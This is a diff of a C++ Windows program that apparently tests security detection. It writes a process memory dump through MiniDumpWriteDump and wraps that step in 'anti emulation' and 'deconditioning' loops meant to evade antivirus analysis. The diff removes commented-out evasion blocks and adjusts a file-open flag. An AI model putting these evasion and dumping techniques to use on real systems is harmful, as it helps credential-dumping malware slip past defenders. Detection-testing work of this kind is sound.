@@ -60,17 +60,6 @@ int main(int argc, char** argv) {
     // antiEmulation should be one of the first actions in the EXE
     // deconditioning depends on anti_emulation + obfuscation (anti-signature)
 #if defined antiEmulation || defined deconditioning
-    /*
-    msg << "Doing anti emulation sleep for 5 sec";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    auto start_ae_sleep = std::chrono::high_resolution_clock::now();
-    std::this_thread::sleep_for(std::chrono::seconds(5));
-    auto end_ae_sleep = std::chrono::high_resolution_clock::now();
-    auto ae_sleep_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_sleep - start_ae_sleep).count();
-    msg << "Slept for approximately " << ae_sleep_elapsed << " ms";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    */
-
     msg << "Doing anti emulation calc operations for about 5 sec";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
     auto start_ae_calc = std::chrono::high_resolution_clock::now();
@@ -176,7 +165,8 @@ int main(int argc, char** argv) {
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
     Sleep(sleep_between_steps_ms);
 #else
-    BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\test.dmp"; // literal string -> already \0 terminated
+    // literal strings -> already \0 terminated
+    BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\test.dmp"; 
     BYTE dumpLibraryBytes[] = "dbghelp.dll";
     BYTE dumpFunctionBytes[] = "MiniDumpWriteDump";
 #endif
@@ -188,8 +178,8 @@ int main(int argc, char** argv) {
     msg << "Before opening out file";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
-    // open / create dump file, must have share_read for deconditioning?
-    HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE | FILE_SHARE_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    // open handle to dump file (overwrite if exists)
+    HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         msg << "Failed to open out file: " << GetLastError();
         print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
@@ -224,25 +214,6 @@ int main(int argc, char** argv) {
     Sleep(sleep_between_steps_ms);
 
 #if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
-    /*
-    msg << "Doing deconditioning calc operations for about 60 sec";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    auto start_decon_calc = std::chrono::high_resolution_clock::now();
-    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
-    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
-    auto end_decon_calc = std::chrono::high_resolution_clock::now();
-    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
-    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    Sleep(sleep_between_steps_ms);
-    */
-
-    /*
-    std::vector<const wchar_t*> procsNoDump = {
-        L"wininit.exe", L"smss.exe", L"services.exe", L"csrss.exe", L"svchost.exe", L"SecurityHealthService.exe", L"winlogon.exe", L"fontdrvhost.exe"
-    };
-    */
-
     msg << "Starting deconditioning";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
 
